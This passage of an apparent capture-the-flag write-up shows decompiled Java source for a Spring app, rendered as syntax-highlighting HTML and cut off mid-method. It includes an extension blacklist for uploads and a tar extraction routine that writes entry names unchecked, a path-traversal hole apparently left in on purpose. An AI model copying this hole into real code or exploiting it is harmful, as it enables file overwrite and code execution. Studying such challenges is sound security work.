class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainController</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">MainController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/view"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> page<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9-]+$"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> viewPath <span class="token operator">=</span> <span class="token string">"/WEB-INF/views/"</span> <span class="token operator">+</span> page <span class="token operator">+</span> <span class="token string">".jsp"</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> realPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span>viewPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">File</span> jspFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>realPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>realPath <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> jspFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token class-name">ModelAndView</span> mav <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mav<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token string">"The file don't exist."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> mav<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/Upload"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">UploadController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">MultipartFile</span> file<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> uploadDir <span class="token operator">=</span> <span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">;</span>            <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> blackList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"jhtml"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"xml"</span><span class="token punctuation">,</span> <span class="token string">"war"</span><span class="token punctuation">,</span> <span class="token string">"jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token class-name">Upload</span><span class="token punctuation">.</span><span class="token function">secureUpload</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> uploadDir<span class="token punctuation">,</span> blackList<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Upload Success: "</span> <span class="token operator">+</span> filePath<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Upload<span class="token punctuation">.</span>UploadException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"The file is forbidden: "</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/BackUp"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">BackUpController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> op<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"tar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">BackUp</span><span class="token punctuation">.</span><span class="token function">tarDirectory</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"backup.tar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Success !"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token string">"Failure : tar Error"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"untar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">BackUp</span><span class="token punctuation">.</span><span class="token function">untar</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"backup.tar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Success !"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token string">"Failure : untar Error"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Failure : option Error"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">d3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">LinkOption</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BackUp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">BackUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">tarDirectory</span><span class="token punctuation">(</span><span class="token class-name">Path</span> outputFile<span class="token punctuation">,</span> <span class="token class-name">Path</span> inputDirectory<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token function">tarDirectory</span><span class="token punctuation">(</span>outputFile<span class="token punctuation">,</span> inputDirectory<span class="token punctuation">,</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">emptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">tarDirectory</span><span class="token punctuation">(</span><span class="token class-name">Path</span> outputFile<span class="token punctuation">,</span> <span class="token class-name">Path</span> inputDirectory<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> pathPrefixesToExclude<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">FileOutputStream</span> dest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>outputFile<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Path</span> outputFileAbsolute <span class="token operator">=</span> outputFile<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Path</span> inputDirectoryAbsolute <span class="token operator">=</span> inputDirectory<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> inputPathLength <span class="token operator">=</span> inputDirectoryAbsolute<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TarOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TarOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Throwable</span> var8 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">walk</span><span class="token punctuation">(</span>inputDirectoryAbsolute<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LinkOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>entry<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>outputFileAbsolute<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                            <span class="token class-name">String</span> relativeName <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>inputPathLength <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            out<span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TarEntry</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> relativeName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token class-name">BufferedInputStream</span> origin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                            <span class="token keyword">int</span> count<span class="token punctuation">;</span>                            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>count <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            origin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            var8<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var17<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var8 <span class="token operator">=</span> var17<span class="token punctuation">;</span>            <span class="token keyword">throw</span> var17<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>out <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        var8<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var16<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">untar</span><span class="token punctuation">(</span><span class="token class-name">Path</span> outputDirectory<span class="token punctuation">,</span> <span class="token class-name">Path</span> inputTarFile<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>inputTarFile<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Throwable</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token function">untar</span><span class="token punctuation">(</span>outputDirectory<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var3 <span class="token operator">=</span> var12<span class="token punctuation">;</span>            <span class="token keyword">throw</span> var12<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fileInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        var3<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">untar</span><span class="token punctuation">(</span><span class="token class-name">Path</span> outputDirectory<span class="token punctuation">,</span> <span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">TarInputStream</span> tarInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TarInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Throwable</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">TarEntry</span> entry<span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>entry <span class="token operator">=</span> tarInputStream<span class="token punctuation">.</span><span class="token function">getNextEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token char">'耀'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token class-name">File</span> outputFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>outputDirectory <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>outputFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        outputFile<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>outputFile<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">BufferedOutputStream</span> dest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> count<span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>count <span class="token operator">=</span> tarInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        dest<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    dest<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    dest<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var17<span class="token punctuation">)</span> <span class="token punctuation">{</span>                var3 <span class="token operator">=</span> var17<span class="token punctuation">;</span>                